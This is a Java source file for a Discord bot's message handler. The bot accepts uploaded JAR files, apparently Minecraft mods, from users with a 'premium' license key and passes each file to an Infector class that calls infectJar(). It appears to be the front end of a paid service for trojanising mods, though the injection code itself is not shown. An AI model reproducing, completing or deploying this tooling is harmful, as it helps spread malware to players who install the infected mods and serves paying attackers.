package xyz.maywr.jugg;

import lombok.Getter;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.events.GenericEvent;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.EventListener;
import org.jetbrains.annotations.NotNull;
import xyz.maywr.jugg.command.CommandManager;
import xyz.maywr.jugg.infector.Infector;
import xyz.maywr.jugg.key.KeyStorage;
import xyz.maywr.jugg.util.IOUtil;
import xyz.maywr.jugg.util.MessageUtil;

import java.util.List;
import java.util.Objects;

/**
 * @author maywr
 * 14.07.2022 21:48
 */
public class MessageHandler implements EventListener
{
	@Getter( lazy = true )
	private static final MessageHandler instance = new MessageHandler();

	@Override
	public void onEvent( @NotNull GenericEvent event )
	{
		if ( !( event instanceof MessageReceivedEvent ) )
			return;
		MessageReceivedEvent msgEvent = ( MessageReceivedEvent ) event;
		if ( msgEvent.getAuthor().isBot() )
			return;
		List< Message.Attachment > attachments = msgEvent.getMessage().getAttachments();
		if ( attachments.size() > 0 )
		{

			if ( !Objects.equals( attachments.get( 0 ).getContentType(), "application/java-archive" ) )
				return;
			if ( !KeyStorage.getInstance().isPremium( msgEvent.getAuthor() ) )
			{
				MessageUtil.error( "enter a license key first", msgEvent.getMessage().getChannel() );
				return;
			}

			if ( !Objects.equals( attachments.get( 0 ).getContentType(), "application/java-archive" ) )
			{
				MessageUtil.error( "sent file is not minecraft mod", msgEvent.getMessage().getChannel() );
				return;
			}
			IOUtil.downloadAsync( attachments.get( 0 ), msgEvent.getMessage()
			                                                    .getChannel(), ServerBootstrap.INPUT_FOLDER, ( file, channel ) ->
			{
				Infector infector = new Infector( file, channel, msgEvent.getAuthor() );
				infector.infectJar();
			} );
			return;
		}
		if ( !msgEvent.getMessage().getContentDisplay().startsWith( "$" ) )
			return;
		CommandManager.INSTANCE.executeCommand( msgEvent.getMessage().getContentDisplay().substring( 1 ), msgEvent );
	}
}
